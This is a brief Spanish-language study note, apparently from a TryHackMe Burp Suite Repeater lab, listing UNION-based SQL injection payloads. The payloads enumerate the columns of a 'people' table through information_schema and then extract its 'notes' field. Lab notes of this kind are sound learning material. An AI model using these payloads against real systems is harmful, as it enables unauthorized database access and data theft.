
######################## sqlinjection
referencia: https://tryhackme.com/room/burpsuiterepeater part8

una vez detectado, determina cantidad de atributos de la tabla (cambiar cantidad de nulls)
 /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"


devuelve nombre de los atributos de la tabla
 /about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"

explotamos el que queremos
/0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
